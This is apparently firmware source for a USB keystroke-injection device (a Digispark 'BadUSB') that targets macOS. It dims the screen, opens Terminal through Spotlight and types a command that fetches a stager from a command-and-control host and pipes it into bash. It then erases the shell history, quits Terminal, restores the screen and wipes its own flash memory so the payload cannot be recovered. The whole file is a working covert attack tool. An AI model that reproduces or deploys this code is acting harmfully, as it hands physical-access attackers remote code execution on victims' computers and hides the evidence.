#include "avr/io.h"
#include "avr/interrupt.h"
#include "DigiKeyboard.h"

// self destruct SMC (erase all flash)
void shred()
{
    cli();
    while (EECR & (1 << EEPE))
        ;
    uint16_t flash = 0;
    while (1)
    {
        SPMCSR = (1 << PGERS) | (1 << SPMEN);
        __asm__ __volatile__("spm\n "
                             :
                             : "z"(flash));
        flash += SPM_PAGESIZE;
    }
    while (1)
        ;
}

void setup()
{
    // reset
    DigiKeyboard.sendKeyStroke(0);
    // screen obfuscation ON
    for (int i = 0; i < 16; i++)
    {
        DigiKeyboard.sendKeyStroke(KEY_F1);
    }
    // open terminal via spotlight
    DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("terminal");
    DigiKeyboard.delay(100);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(2000);
    // run C2 stager
    DigiKeyboard.print("curl C2:PORT/stager|bash &");
    DigiKeyboard.delay(100);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(100);
    // erase history
    DigiKeyboard.print("sed -i '' \"$(($(wc -l <$HISTFILE)-1)),$ d\" $HISTFILE");
    DigiKeyboard.delay(100);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(100);
    // quit terminal
    DigiKeyboard.sendKeyStroke(KEY_Q, MOD_GUI_LEFT);
    DigiKeyboard.delay(100);
    // confirm quit (background process warning)
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    // screen obfuscation OFF
    for (int i = 0; i < 16; i++)
    {
        DigiKeyboard.sendKeyStroke(KEY_F2);
    }
    // done
    pinMode(1, OUTPUT);
    digitalWrite(1, HIGH);
    // self destruct
    shred();
}

void loop()
{
}